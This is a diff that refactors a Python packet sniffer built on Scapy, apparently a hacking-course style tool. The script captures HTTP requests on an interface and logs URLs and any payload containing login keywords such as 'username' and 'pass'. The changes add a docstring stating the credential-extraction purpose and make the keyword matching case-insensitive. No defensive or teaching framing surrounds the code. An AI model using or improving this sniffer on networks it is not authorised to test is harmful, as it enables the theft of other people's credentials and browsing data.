@@ -1,5 +1,15 @@
 #!/usr/bin/env python
 
+"""
+This script sniffs network packets on a specified interface and extracts the URL of HTTP requests
+as well as possible login information. It uses the Scapy library for packet sniffing and parsing.
+
+Usage: python packet_sniffer.py -i <interface>
+
+Options:
+  -i, --interface   The network interface to sniff packets on.
+"""
+
 import argparse
 import urllib.parse
 
@@ -19,8 +29,8 @@ def sniff_packets(interface):
 
 def get_url(packet):
     # Extract the URL from an HTTP request packet
-    url = (packet[http.HTTPRequest].Host.decode("utf-8", errors="ignore")
-           + packet[http.HTTPRequest].Path.decode("utf-8", errors="ignore"))
+    url = (packet[http.HTTPRequest].Host.decode("utf-8", errors="ignore") +
+           packet[http.HTTPRequest].Path.decode("utf-8", errors="ignore"))
     # Decode and unquote the URL to a human-readable format
     url = urllib.parse.unquote(url)
     return url
@@ -31,9 +41,9 @@ def get_login_info(packet):
         # Extract and decode the payload from an HTTP packet
         load = packet[http.Raw].load.decode("utf-8", errors="ignore")
         load = urllib.parse.unquote(load)
-        keywords = ["username", "Username", "uname", "Uname", "login", "Login", "pass", "Pass"]
+        keywords = ["username", "uname", "login", "pass"]
         for keyword in keywords:
-            if keyword in load:
+            if keyword.lower() in load.lower():
                 return load  # Return the payload if a keyword is found
     except UnicodeDecodeError:
         # Handle the case where payload decoding fails
@@ -56,7 +66,7 @@ def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i", "--interface", dest="interface", help="Interface for sniffing")
     options = parser.parse_args()
-    interface = str(options.interface)
+    interface = options.interface
     return interface
 
 
